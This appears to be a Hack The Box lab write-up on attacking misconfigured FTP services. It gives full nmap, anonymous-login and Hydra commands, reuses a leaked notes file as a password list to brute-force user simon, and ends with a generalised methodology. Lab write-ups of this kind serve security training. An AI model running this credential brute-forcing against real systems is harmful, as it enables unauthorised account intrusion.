# Attacking Common Services — Medium Walkthrough (FTP Misconfiguration)

**Source:** HTB write-up — anonymous FTP info disclosure → custom wordlist → Hydra brute-force → flag

---

## Scenario

- Lab focuses on exploiting a **misconfigured FTP service** via enumeration, information disclosure, and credential brute-forcing.

---

## Phase 1 — Enumeration & Recon

```bash
nmap -sV -sC -A -T4 -p- -oN namp 10.129.8.254
```

**Services found:**

| Port | Service |
|---|---|
| 2121 | "Secured" FTP service (requires auth) |
| 30021 | Internal FTP service |

---

## Phase 2 — Initial Access via Anonymous Login

- Port **30021** allowed **anonymous login**.

```bash
ftp 10.129.8.254 30021
# login: anonymous / (no password)
```

- Found a directory named **`simon`** → inside it, a file: **`mynotes.txt`**.

```ftp
get mynotes.txt
```

- Inspected with `cat mynotes.txt` → contents appeared to be a list of **potential passwords/strings** associated with the user `simon`.

---

## Phase 3 — Weaponization & Brute Force

- Inferred username: **`simon`** (from the directory name).
- Used `mynotes.txt` directly as a **custom password wordlist** against the secured FTP service.

```bash
hydra -l simon -P mynotes.txt ftp://10.129.8.254:2121
```

- Hydra successfully **cracked the password** for `simon` on port 2121.

---

## Phase 4 — Exploitation & Flag Capture

```bash
ftp 10.129.8.254 2121
# login with simon's cracked credentials
ls
get flag.txt
```

---

## Full Command Sequence (Quick Reference)

```bash
nmap -sV -sC -A -T4 -p- -oN namp 10.129.8.254

ftp 10.129.8.254 30021      # anonymous login
get mynotes.txt

hydra -l simon -P mynotes.txt ftp://10.129.8.254:2121

ftp 10.129.8.254 2121       # login as simon
ls
get flag.txt
```

---

## Full Attack Chain Summary

1. **Full port scan** (`-p-`) reveals two separate FTP services on non-standard ports (2121, 30021).
2. **Anonymous login** permitted on the "internal" FTP (30021) → classic misconfiguration.
3. **Information disclosure**: a user-named directory (`simon`) and a notes file leak **candidate credential material**.
4. **Custom wordlist attack**: instead of a generic wordlist, the leaked file itself becomes the password list for Hydra.
5. **Credential reuse across FTP instances** (anonymous-accessible service leaks creds for the "secured" one) → full access → flag retrieved.

---

## Key Takeaways

- Always do a **full port range scan** (`-p-`) — services on non-standard ports (like FTP on 2121/30021 instead of 21) are easy to miss with default scans.
- **Anonymous FTP access** is a classic and still-common misconfiguration — always test it when FTP is found.
- Treat any discovered file from an accessible service as **potential credential material** — don't just read it for context, consider using it directly as a wordlist.
- A file named after a user, found in a directory named after that user, strongly suggests **username enumeration via directory/file naming** — a pattern worth watching for broadly.
- This mirrors a reusable methodology: **weak/anonymous access on one service → leaked info → brute-force a second, more restricted service** using that leaked info.
